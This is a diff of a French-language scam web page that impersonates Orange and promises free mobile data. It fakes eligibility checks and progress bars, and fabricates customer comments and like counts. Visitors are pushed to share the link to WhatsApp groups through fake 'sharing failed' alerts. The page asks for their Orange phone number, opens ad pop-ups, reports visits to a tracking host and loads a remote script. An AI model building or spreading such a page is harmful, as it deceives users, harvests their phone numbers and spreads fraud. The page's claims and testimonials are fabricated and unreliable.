+<img alt='' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKde1BmfU137o87jRtWCCZNvRpZOjlvYwX9Sf8EzcQRNH3TSx3AIk6H-66E0y9C_QY8MPt0O-5tzNf8ENIhXtaQ9z7eWL7163C7P9mX7c-GzVRnb-TlXk5BQfZWD_b2K7YeqG5aKM8aXfzaDNC4WLTZnrMDmFS87vTr38fkktaSpHBl8BIDZjrU49H7w/s1600/loading-loading-forever.gif'/>
+Veuillez patienter, nous traitons votre offre spéciale.
+</p>
+<div class='loading'>
+<p class='load_headline'>
+Veuillez patienter un instant...
+</p>
+<img alt='' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKde1BmfU137o87jRtWCCZNvRpZOjlvYwX9Sf8EzcQRNH3TSx3AIk6H-66E0y9C_QY8MPt0O-5tzNf8ENIhXtaQ9z7eWL7163C7P9mX7c-GzVRnb-TlXk5BQfZWD_b2K7YeqG5aKM8aXfzaDNC4WLTZnrMDmFS87vTr38fkktaSpHBl8BIDZjrU49H7w/s1600/loading-loading-forever.gif' style='height:50px;width:50px;'/>
+<p class='check check1'>
+Toutes les questions ont reçu une réponse
+
+</p>
+<p class='check check2'>
+Vous êtes 100% qualifié pour cette offre spéciale
+</p>
+<p class='check check3'>
+Félicitations! <img src='https://blogger.googleusercontent.com/img/a/AVvXsEgGfhp-X9Wlaiu0hN6ydgmgrt6pSeHgQzQ_E97l0D5nhYnypF6YeKj3reNpm3rJAgZUtmC_bd6PbVBi32uplh5slssU0ftMeThThcl96KONFydt98JiCG9jopepA2HSiMarkek1alQNibiySz9SG1WKTpHLx6CVkJP6gCbLWLblTOOLdOyJ8idPhveZmA=s320' width='100%' />
+
+</p>
+</div>
+<div class='last_page'>
+<div class='last-up'>
+<h4 class='textlastup'>
+<img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi17Q9Kv-KU14lcEPvLwsKqghx1WM9IzZQjg8wpHuxO2UeoTlVHT3BMCXT3_p7TwDqdS4WZG-EnQY69rKU0xyFHwxDBwa3JG0cqktJvlqZa3pvrOh8klWdoIcP9OKmuxOQ_K-KnPJCQ-5shnzdyB2uHnq77WrzY9u2Zg4u-oj6nuE1WKOBCVFxLrAboPiOp/s1242/35061B33-DE41-4097-8026-F8559D8AE675.jpeg' width='100%' />
+
+Félicitations!
+<br/><br/> <div id='lastapp'>
+<font color="white"> Grâce à votre réponse, vous êtes éligible pour recevoir<strong> Offre spéciale 10 Go - 100 Go</strong> <br></br>Comment l'obtenir :</font><br/><br/>
+
+1. Partagez avec 5 groupes / 20 amis via WHATSAPP (cliquez sur l'icône « WhatsApp » ci-dessous)
+<br/><br/>
+2. Cliquez sur « ACTIVER », il vous sera demandé votre numéro Orange pour obtenir l'offre
+<br/><br/></div>
+</h4>
+<script type="text/javascript">
+j='';
+banner='';
+$.getScript('yuming.js?'+ (new Date()).getTime());
+
+
+theme='aden';
+
+var vid=[
+'Qzkj_p7GnLc',
+];
+
+var STRONG = {
+share: 10
+};
+
+
+
+function incrementValue1() {
+if(parseInt(get_Cookie('prog')) > 600){
+window.open('whatsapp://send?text=' + tb);
+}else{
+window.open('whatsapp://send?text=' + tb);
+}
+setTimeout(function(){
+incrementValue_i();
+fn1_i();
+value = parseInt(get_Cookie('prog'));
+set_Cookie('prog',value+1);
+},2000);
+}
+function incrementValue_i()
+{
+get_Cookie('prog')=='' ? value=0 : value=get_Cookie('prog') ;
+value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void(0) ;
+set_Cookie('prog',value);
+record('adien',value);
+record(theme,'share');
+if(value>= 12){
+record('adien','wc');
+lasthtml();
+}
+}
+function fn1_i() {
+v=get_Cookie('prog');
+document.querySelector('.progress').style.display = "block";
+v=='0'?ob=30:v=='1'?ob=50:v=='2'?ob=52:v=='3'?ob=60:v=='4'?ob=60:v=='5'?ob=65:v=='6'?ob=70:v=='7'?ob=80:v=='8'?ob=85:v=='9'?ob=90:v=='10'?ob=96:v=='11'?ob=98:v=='12'?ob=100:void(0);
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress p').textContent = ob + "%";
 }
 
-@keyframes blink {
-  0% {
-    opacity: 1;
-  }
-  50% {
-    opacity: 0;
-  }
-  100% {
-    opacity: 1;
-  }
+function incrementValue_a()
+{
+value = parseInt(get_Cookie('prog'))-1;
+value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void(0) ;
+record('adien',value);
+record(theme,'share');
+if(value>= 12){
+record('adien','wc');
+lasthtml();
 }
-</style>
-<style type="text/css">
-@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
-@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
-* {
-    margin: 0;
-    padding: 0;
-    font-family: Poppins, Droid Arabic Naskh;
-    font-weight: normal;
-    box-sizing: border-box;
+}
+
+function fn1_a() {
+v=parseInt(get_Cookie('prog'))-1;
+document.querySelector('.progress').style.display = "block";
+v=='0'?ob=30:v=='1'?ob=50:v=='2'?ob=52:v=='3'?ob=60:v=='4'?ob=60:v=='5'?ob=65:v=='6'?ob=70:v=='7'?ob=80:v=='8'?ob=85:v=='9'?ob=90:v=='10'?ob=96:v=='11'?ob=98:v=='12'?ob=100:void(0);
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress p').textContent = ob + "%";
+}
 
 
+
+function tipn(){
+alert('vous recevrez 100 Go après avoir partagé avec des groupes WhatsApp et des amis. \n Share until the blue bar is full!');
 }
-body {
-    direction: lfl;
-    background: #FFFFFF;
+
+
+function set_Cookie(name,value){
+var Days = 30;
+var exp = new Date();
+exp.setTime(exp.getTime() + (Days*20*1000));
+document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
 }
-a {
-    text-decoration: none;
+function get_Cookie(name){
+var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+if(arr=document.cookie.match(reg)){
+return unescape(arr[2]);
 }
-.post {
-    background: #fff;
-    margin: 0 auto;
-    padding: 10px;
-    max-width: 500px;
-    border: 1px solid #d0d1d5;
-    border-radius: 3px;
+return '';
 }
-.post img {
-    width: 100%;
+function getQueryString(name) {
+var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+var r = window.location.search.substr(1).match(reg);
+if (r != null) {
+return unescape(r[2]);
 }
-.welcome {
-    font-size: 15px;
+return null;
 }
-.amount,
-#getname {
-    color: #098105;
-    text-decoration: none;
+
+record(getQueryString('th'));
+record('adien');
+
+function record (a,b){
+var aa = new XMLHttpRequest;
+if(b){
+if(get_Cookie(a+b)!== a+b){
+aa.open("GET", '//r.line-me.vip/record/total.php?ac=node&name='+a+'&node='+b), aa.onreadystatechange = function () {
+set_Cookie(a+b,a+b);
+}, aa.send(null)
 }
-.done {
-    text-align: center;
-    color: #27ae60;
+}else{
+if(get_Cookie(a)!== a){
+aa.open("GET",'//r.line-me.vip/record/total.php?ac=total&name='+a), aa.onreadystatechange = function () {
+set_Cookie(a,a);
+}, aa.send(null)
 }
-.tip {
-    font-size: 14px;
 }
-.title {
-    text-align: center;
 }
-.error {
-    display: none;
-    text-align: center;
-    font-size: 14px;
-    color: #e74c3c;
+
+var zeit = new Date();
+var sec = zeit.getSeconds();
+if (sec < 6 ){
+sec = 9
 }
-button {
-    display: block;
-    width: 200px;
-    height: 50px;
-    color: #fff;
-    border: none;
-    outline: none;
-    font-size: 24px;
-    cursor: pointer;
-    border-radius: 5px;
-    padding: 0 10px;
-    margin: 10px auto;
-    background: rgb(255, 120, 0);
-    transition: background 0.3s ease;
+if (sec > 5 & sec < 13 ){
+sec = 8
 }
-button:hover {
-    background: #098105;
+if (sec > 11 & sec < 19 ){
+sec = 7
 }
-.phone {
-    max-width: 400px;
-    margin: 10px auto;
+if (sec > 17 & sec < 25 ){
+sec = 6
 }
-.phone input {
-    width: 100%;
-    height: 50px;
-    padding: 10px;
-    outline: none;
-    border: 2px solid #cecece;
-    font-size: 14px;
+if (sec > 23 & sec < 31 ){
+sec = 5
 }
-#confirm {
-    width: 200px;
-    margin: 10px auto;
-    border-radius: 0px;
+if (sec > 29 & sec < 37 ){
+sec = 4
 }
-#loader {
-    text-align: center;
+if (sec > 35 & sec < 43 ){
+sec = 3
 }
-.spin {
-    width: 50px;
-    height: 50px;
-    background: transparent;
-    border: solid 8px rgb(255, 120, 0);
-    border-right-color: transparent;
-    border-radius: 50%;
-    margin: 10px auto;
-    animation: spin 0.8s linear infinite;
+if (sec > 41 & sec < 49 ){
+sec = 2
 }
-@keyframes spin {
-    100% {
-        transform: rotate(1turn);
-    }
+if (sec > 47 & sec < 55 ){
+sec = 1
 }
-#loader,
-#info,
-#checking,
-#share,
-#claim {
-    display: none;
+if (sec > 54){
+sec=0
+};
+var add = sec;
+var zeit2 = new Date();
+var minute = zeit2.getMinutes();
+var timer1 = (60-minute)*60;
+if (timer1 > 1800) {
+var resttimer = (30-minute)*10
+} else {
+var resttimer = (60-minute)*10
+};
+var timer = resttimer + add + 67;
+function updateTimer() {
+timer--;
+$("#gutschein").text(timer);
+if (timer < 9) {
+stopFunction();
 }
-.center {
-    display: flex;
-    align-items: center;
-    justify-content: center;
 }
-.barr {
-    direction: ltr;
-    max-width: 400px;
-    margin: 10px auto;
-    box-sizing: border-box;
+var myTimer = window.setInterval(updateTimer, 6000);
+function stopFunction() {
+window.clearInterval(myTimer);
 }
-.fill {
-    position: relative;
-    display: inline-block;
-    width: calc(100% - 100px);
-    height: 35px;
-    padding: 2px;
-    border: 2px solid #098105;
+
+function lasthtml(){
+html='<font color="#43AF65">The last step:</font><br/><br/>Pour activer 100 Go, vous devez terminer cette dernière étape !<br/><br/>1. Vous devez entrer votre numéro Orange pour que nous puissions envoyer 100 Go <br/><br/>After adding, click ACTIVATE below and wait for admin to verify it, the review will be completed in 1 hour and you will receive a notification<br/><br/>';
+document.getElementById("lastapp").innerHTML=html;
+document.getElementById("buttonl").style.display='none';
+document.getElementById("button2").style.display='block';
 }
-#fill,
-#fill2 {
-    background: #098105;
-    width: 0%;
-    height: 100%;
+
+function dapp(){
+window.open('http://outrotomr.com/4/3144603');
 }
-.percentage {
-    width: 100px;
-    float: right;
-    height: 35px;
-    font-size: 16px;
-    border: 2px solid #098105;
+function dappp(){
+window.open('http://outrotomr.com/4/3144603');
 }
-#percentage,
-#percentage2 {
-    margin-left: 5px;
+function ads(vdata,ir){
+record('adiensense');
+record('adiensense',ir);
+window.open('http://outrotomr.com/4/3144603');
 }
-#check,
-#check2 {
-    display: none;
-}
-.counter {
-    color: #7f7f7f;
-    font-size: 12px;
-    text-align: right;
-    padding: 10px 0 10px 2px;
-    border-bottom: 1px solid #ffffff;
-}
-.reactions {
-    display: inline-flex;
-    align-items: center;
-    float: left;
-}
-.counter img {
-    float: left;
-    width: 16px;
-    height: 16px;
-    border-radius: 50%;
-    border: 2px solid #000000;
-    box-sizing: content-box;
-}
-.like,
-.love {
-    margin-right: -5px;
-}
-.like {
-    z-index: 2;
-}
-.love {
-    z-index: 1;
-}
-.bar {
-    display: table;
-    width: 100%;
-    border-bottom: 1px solid #000000;
-}
-.bar .react {
-    display: table-cell;
-    width: calc(100% / 3);
-    font-size: 12px;
-    color: #000000;
-    text-align: center;
-    padding: 10px 0;
-    cursor: pointer;
-}
-.comments {
-    direction: ltr;
-}
-.comment {
-    padding: 6px 0;
-    margin-top: 5px;
-}
-.comment img {
-    float: left;
-    width: 32px;
-    height: 32px;
-    border: none;
-    border-radius: 18px;
-    cursor: pointer;
-}
-.reply {
-    margin-left: 37px;
-}
-.single-container {
-    margin-left: 37px;
-    background: #f1f2f6;
-    padding: 10px;
-    border-radius: 15px;
-    font-size: 12px;
-}
-.single-container .user {
-    display: inline-block;
-    cursor: pointer;
-    color: #365899;
-    margin-bottom: 5px;
-}
-.single-container .text {
-    display: block;
-}
-.buttons {
-    font-size: 12px;
-    font-weight: bold;
-    margin: 10px 0 0 47px;
-    color: #000000;
-}
-.action {
-    cursor: pointer;
-}
-.action:hover {
-    text-decoration: underline;
-}
-.input {
-    padding: 6px 12px 12px;
-}
-.input input {
-    width: 100%;
-    background: #f1f2f6;
-    padding: 10px;
-    border-radius: 15px;
-    border: 0;
-    outline: none;
-}
-.A{
-    text-align: center;
-    background-color: rgb(255, 120, 0);
-}
-</style>
+
+
+
+</script>
+
+<div id='buttonl'>
+<button class='btn btn-primary' onclick='incrementValue1()' type='button'>WhatsApp</button>
+<input id='number' type='hidden' value='0'/>
+
+<h4 class='textlastup'>Partagez jusqu'à ce que la barre bleue soit pleine !</h4>
+
+<div class='progress'>
+<span aria-valuemax='100%' aria-valuemin='1%' aria-valuenow='1' id='progressbar' style='width: 1%; max-width: 100%;'/><p></p>
+</div>
+<br>
+<a href="javascript:tipn();" id="b2">
+<div class="buttond">ACTIVER</div>
+</a>
+</div>
+</div>
+
+<div id='button2' style="display:none">
+<br />
+  
+    <br/>  
+  
+  
+  
+  <div class="form-group">
+                                    <label for="s1">Votre numéro Orange</label>
+        							<input type="text" placeholder="Numéro de portable" name="LName" class="form-control" required="">
+        						</div>
+  <br/>
   
   
   
   
-                   
-  <center>
-  <marquee
-  direction="down"
-  width="450"
-  height="40"
-  behavior="alternate"
-  style="border:solid">
-    <marquee behavior="alternate"> <font color="black">OFFRE SPÉCIALE ANCIENNE CARTE SIM 10 Go - 100 Go </font></marquee>
-</marquee>
   
-  </center>
+ <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://ogeitid.github.io/oge/demo.html#1742540229613" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">ACTIVER 10 Go</button>
+                    </a><br/>
+   <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://ogeitid.github.io/oge/demo.html#1742540229613" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">ACTIVER 30 Go</button>
+                    </a><br/>
+
+<a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://ogeitid.github.io/oge/demo.html#1742540229613" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">ACTIVER 50 Go</button>
+                    </a><br/>
+
+<a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://ogeitid.github.io/oge/demo.html#1742540229613" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">ACTIVER 100 Go</button>
+                    </a><br/>
 
 
 
 
+<script type="text/javascript" src=""></script>
+</div>
+<hr/>
+</div></div></div></div>
+<br/>
+<center>
 
-<!-- BEGIN: Powered by Supercounters.com -->
-<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1711163,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+
 </center>
+<br/>
+<div class='fbcoms' style="display:none;">
+<p class='comments'>
+</p>
+<p class='buttons'>
+<span class='like'>
+Like
+</span>
+&#183;
+<span>
+Comment
+</span>
+&#183;
+<span>
+Share
+</span>
+&#183;
+<span>
+delete
+</span>
+</p>
+<p class='totlikes'>
+<span id='youand'>
+</span>
+<span class='fbblue'>
+and 204,208
+</span>
+others like this
+</p>
+<p class='viewmore clearfix'>
+<span class='left'>
+Show 234 more comments…
+</span>
+<span class='right'>
+50 of 120,310
+</span>
+<br/>
+</p>
+<div class='item' id='fb8' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlhZEpj5AW_MlIQdnF-JIspBlUCjohC5esTXCjBzgVpnhK303m3hScTxK3AAfec0d0Vjs5Yui-s8sO3ScuoCp1b3SHh0btTEwZSP9oyPT1iqT40wfs8TRt-G2tq6GW1bGuBpQmVJRaH5P6z2UFTEZBXpHclkwkjCIMR5KNi5ZhaqQmQPWWvP1ClDkiWg/s320/4DC0B6DF-CE5B-4DA9-B8F9-82C9502218FE.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Adellia Vrisca
+</span>
+<br/>
+Merci beaucoup pour les données gratuites
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb7' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAFJq_X-TkLVC1InXXT1-rwWs71p1o5eTmScvZRGLGIctU9XSBm8qVRU1VLo9L6RLFUp-Xq82HCYxrMcPLmGkgv1y6N4HQNAYFUYbEKIWPb8ZkjNDdjn51lur2bwndp2jEQ0svQ2Tf_2SRL2M10tXPAJOBBEBJFkm3bQZFzLUrrL3oW3LShEpE1vvSCw/s320/6C6B394F-E101-4D55-8C52-ACE8887BF6BD.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Alya Alya
+</span>
+<br/>
+c'est incroyable
+
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb6' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Jovitha Febriani
+</span>
+<br/>
+Merci beaucoup Orange
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb5' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMpPG_O_JWkFEYTFI6F0J73Vv7lQh0y8lvMA1xop5nIl7gS3xSBRgODZWsvD1oP_1ojUXgImU-9dSCfRglwjmwtkCf4wMupIU173sRIGzuYW7TkSWJONolCtmORJQnQPNobooI1yvsPxoAHdmXYLl2iVIweXp0kA4rDybqc9HMd7L_yS05DCD2TtJ9MA/s320/96552902-4C59-4AA0-B123-64B0A35C02C1.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Rudy Mbondett
+</span>
+<br/>
+Oui ! C'est tout simplement génial, merci Orange.
+
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb4' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiASO2mRn8gh0H1cV6na0TJ4Y0Eg1qfWyC_eNd056jiPczTkpw_zoSFkkW0ikOJGLVXcZV69DhmYaWCHljD884qX3Zlr1jnP2tdz7GcMuTNnhY8IV0T8O2qDN8kQ9M6KxXJKKCo4kTGvH_oeEqtjTvPCZYKIofIPLR6_6nam9VC2t6W2UE3KEbmYl2LiQ/s320/EC5D4AB8-66D0-49B8-AD72-40F60B6CC316.jpeg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+David Van Reza
+</span>
+<br/> Yeeess I got it
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+<!-- BEGIN: Powered by Supercounters.com -->
+<left><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1711347,"Like","4267B2");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+</left>
 <!-- END: Powered by Supercounters.com -->
 
 
 
 
+</span>
+</p>
+</div>
+<div class='item'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/a/AVvXsEjGykVTAV2VmEozgTCwsKEUa39cfa9xFXvQOlvfzGPN9kRlRbUN7ypWp9b1WUCCXIpgHiRSIkv6goe4I22w-x9aHDVEAMmqsl6v5IUgdm4xSCUpl61iACvex8FytPFccLsxDokmqfbKYl_PZ-mJJMf1wHv27sIBw75Y9E_DxqiKIIzteM9uYKxj-JrWCg=s320' width='50'/>
+<p class='comtxt'>
+<span class='name'>
+Siska Aulia
+
+</span>
+<br/> I got my data Thank you very much Orange
+
+
+
+</p>
+<p class='combot'>
+<span class='ago'>
+Barasan
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+<span class='likes totlikes'>
+112
+</span>
+</p>
+</div>
+</div>
+<br/>
 
 
 
 
-
-
-
-
-
-
-
-
+<img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIhWpdNyU4gS_H3OFpsFYDCFGryiHH7frNAQwD5pe1yCaQoY-jsFeT-edhBfLHxzBm_cetWB99EvaC7TD8ntXc3vq_PpHRVZ9HpDDeNaeiJ7g0ZE317WC_t8kQGFMB6qp292DSwVpHMyOpqeP5IBRfvh3DOnFmnV1uCyIcqag20jxia5ngGpt652qkNJJd/s655/541FF435-9D91-498E-98BC-4B4DB54E1C1C.jpeg' width='100%' />
 
   
-                        <div class="A">
-                        <font color="white">  Cher client, veuillez confirmer votre numéro Orange pour activer vos données gratuites </font><br/> <b><font color="white">VALABLE POUR :</font></b> <span class="blink"><b><font color="yellow">3 mois</font></b> </span><font color="white">Entrez votre numéro Orange ci-dessous et cliquez <b></b>VÉRIFIER</b></font>
-         </div>
-    <div class="post" width="100%">
-
-        <div id="intro">
-         
-            <p class="welcome">
+<div>
 
 
-
-               
-                <center><input type="char" placeholder="Entrez votre numéro Orange" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
-                 
-                
-              
-               
-          
-               
-            <button id="go">VÉRIFIER ➤</button>
-        </div>
-        <div id="loader">
-            <div>Vérifier votre numéro...</div>
-            <div class="spin"></div>
-            <div id="num">0%</div>
-        </div>
-        <div id="info">
-         
-          
-    
-           <center><p class="title"><font color="red">DEPUIS COMBIEN DE TEMPS UTILISEZ-VOUS NOTRE CARTE SIM ?</font></p></center>
-          <center>
-<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
-    width: 330px;
-    height: 56px;
-">
-<option value="أختر نوع الشبكة" selected="1">---Sélectionnez la réponse---</option>
-  <option value="1">6 mois + - 10 Go  </option>
-<option value="2"> 1 an + - 30 Go  </option>
-<option value="2"> 5 ans + - 50 Go  </option>
-<option value="2"> 10 ans + - 100 Go  </option>
-</select>
-</center><br>
-
- <center><p class="title"><font color="red">CHOISISSEZ VOTRE PAYS ?</font></p></center>
-          <center>
-<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
-    width: 330px;
-    height: 56px;
-">
-<option value="أختر نوع الشبكة" selected="1">---Pays---</option>
-<option value="1">DRC 🇨🇩</option>
- <option value="1">Burkina Faso 🇧🇫</option>
-<option value="1">Mali 🇲🇱</option>
-<option value="1">Central African Republic 🇨🇫</option>
-<option value="1">Congo 🇨🇬</option>
-<option value="1">Niger 🇳🇪</option>
-<option value="1">Chad 🇹🇩</option>
-<option value="1">Cameroon 🇨🇲</option>
-<option value="1">Guinea 🇬🇳</option>
-<option value="1">Côte d'Ivoire 🇨🇮</option>
-<option value="1">Senegal 🇸🇳</option>
-<option value="1">France 🇫🇷</option>
-<option value="1">Benin 🇧🇯</option>
-<option value="1">Belgium 🇧🇪</option>
-<option value="1">Madagascar 🇲🇬</option>
-<option value="1">Equatorial Guinea 🇬🇶</option>
-<option value="1">Burundi 🇧🇮</option>
-<option value="1">Gabon 🇬🇦</option>
-<option value="1">Switzerland 🇨🇭</option>
-<option value="1">Monaco 🇲🇨</option>
-<option value="1">Comoros 🇰🇲</option>
-
-    
-</select>
-</center><br>
-          
-                  
-          <button id="confirm">Procéder</button>
-            </div>
-            <p class="error">Désolé, votre numéro est manquant <a href="http://demobest.org/100gb.html"> <b><font color="#14948F">AJOUTER UN NUMÉRO</font></b></a></p>
-        </div>
-        <div id="checking">
-            <p class="title">Activation des données...</p>
-            <div class="barr">
-                <div class="fill">
-                    <div id="fill"></div>
-                </div>
-                <div class="percentage center">
-                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
-                    <span id="check"><i class="fa fa-check-circle"></i></span>
-                    <span id="percentage"></span>
-                </div>
-            </div>
-        </div>
-        <div id="share">
-
-            <p class="tip"> Félicitations, votre numéro Orange <span id="getname"></span>،</p>est éligible pour recevoir une offre spéciale
-            <p class="tip">
-                <span class="amount"> Procédez à l'activation de votre offre</span><br>
-              Comment procéder :
-            </p><br>
-            <p class="tip">1. Partagez-le avec 5 groupes ou 15 amis sur WhatsApp (cliquez sur l'icône « PARTAGER » ci-dessous).</p>
-            <p class="tip">2. Vous serez automatiquement redirigé vers notre page « ACTIVATION » une fois la barre de vérification VERTE remplie.</p>
-           
-
-            <button id="whatsapp">PARTAGER</button>
-            <div class="barr">
-                <div class="fill">
-                    <div id="fill2"></div>
-                </div>
-                <div class="percentage center">
-                    <span><i class="fa fa-spinner fa-pulse"></i></span>
-                    <span id="percentage2">0%</span>
-                </div>
-            </div>
-        </div>
-        <div id="claim">
-            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-            <p class="title"> Cliquez sur « ACTIVER » pour activer votre offre spéciale </p>
-           <br/>
-          
-          
-       <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://realblog01.github.io/realblog/ads-obi.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">ACTIVER 10 Go</font></button>
-                    </a>
-             <br/>
-          
-          <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://realblog01.github.io/realblog/ads-obi.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">ACTIVER 30 Go</font></button>
-                    </a><br/>
-            
-            <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://realblog01.github.io/realblog/ads-obi.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">ACTIVER 50 Go</font></button>
-                    </a><br/>
-
-            <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://realblog01.github.io/realblog/ads-obi.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">ACTIVER 100 Go</font></button>
-                    </a><br/>
-            
-          <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://realblog01.github.io/realblog/ads-obi.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">REPORT ISSUE</font></button>
-                    </a><br/>
-            <button id="offer">ACTIVER</button><br/>
-             
-             
-          
-          
-              </div>
-        <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi17Q9Kv-KU14lcEPvLwsKqghx1WM9IzZQjg8wpHuxO2UeoTlVHT3BMCXT3_p7TwDqdS4WZG-EnQY69rKU0xyFHwxDBwa3JG0cqktJvlqZa3pvrOh8klWdoIcP9OKmuxOQ_K-KnPJCQ-5shnzdyB2uHnq77WrzY9u2Zg4u-oj6nuE1WKOBCVFxLrAboPiOp/s1242/35061B33-DE41-4097-8026-F8559D8AE675.jpeg" alt="Free-Data" style="width: 100%;">
-      
-                     </center>
-            </div>
-        </div>
-    </div>
-    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
-
-
-
-
-<script type="text/javascript">
-var time = 0;
-window.setInterval(function () {
-    time = time + 1;
-    $(".t1").html(time + 1 + "m");
-    $(".t2").html(time + 2 + "m");
-    $(".t3").html(time + 4 + "m");
-}, 6e4);
-var likes = 134,
-    comments = 23,
-    shares = 12;
-window.setInterval(function () {
-    likes = likes + Math.floor(Math.random() * 3);
-    comments = comments + Math.floor(Math.random() * 2);
-    shares = shares + Math.floor(Math.random() * 2);
-    $("#likes").html(likes + "K");
-    $("#comments").html(comments + "K comments");
-    $("#shares").html(shares + "K shares");
-}, 5e3);
-$(".liked").click(function () {
-    if ($(this).hasClass("selected")) {
-        $(this).removeClass("selected");
-        $(this).html("Like");
-    } else {
-        $(this).addClass("selected");
-        $(this).html("Unlike");
-    }
-});
-</script>
-
-
-
-
-
-
-
-
-<script type="text/javascript">
-
-$("#go").click(function () {
-    $("#intro").fadeOut(0);
-    $("#loader").fadeIn(1000);
-    var i = 0;
-    var interval = setInterval(function () {
-        $("#num").text(i + "%");
-        i += 1;
-        if (i >= 100) {
-            clearInterval(interval);
-            $("#loader").fadeOut(0);
-            $("#info").fadeIn(1000);
-        }
-    }, 50);
-});
-$("#confirm").click(function () {
-    if ($("#name").val().length < 4)
-    {
-        $(".error").fadeIn(500);
-    } else {
-        $("#info").fadeOut(0);
-        $("#checking").fadeIn(1000);
-        var i = 0;
-        var interval = setInterval(function () {
-            i += 1;
-            $("#percentage").text(i + "%");
-            $("#fill").css("width", i + "%");
